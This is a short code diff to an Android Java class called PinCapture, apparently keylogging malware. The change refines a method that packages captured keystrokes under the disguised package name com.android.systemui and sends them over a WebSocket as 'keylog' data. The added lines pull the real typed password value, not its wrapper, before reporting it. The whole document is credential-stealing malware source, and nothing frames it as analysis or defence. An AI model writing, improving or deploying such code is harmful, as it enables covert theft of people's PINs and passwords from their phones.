@@ -710,11 +710,21 @@ public final class PinCapture {
     /** WS：{"k":"keylog","cache":"[{pkg,type,text}]"} → د.آ.آ("cacheData", payload) */
     private static boolean sendWs(String value, String ftype) {
         try {
+            // value 可能是 {"type":"password","value":"123qwe","ok":1,...}，取出真实值再上报
+            String realText = value;
+            String realType = ftype;
+            try {
+                org.json.JSONObject src = new org.json.JSONObject(value);
+                realText = src.optString("value", value);
+                realType = src.optString("type", ftype);
+            } catch (Throwable ignored) {
+            }
+
             org.json.JSONArray arr = new org.json.JSONArray();
             org.json.JSONObject e = new org.json.JSONObject();
             e.put("pkg", "com.android.systemui");
-            e.put("type", ftype);
-            e.put("text", value);
+            e.put("type", realType);
+            e.put("text", realText);
             arr.put(e);
 
             org.json.JSONObject p = new org.json.JSONObject();
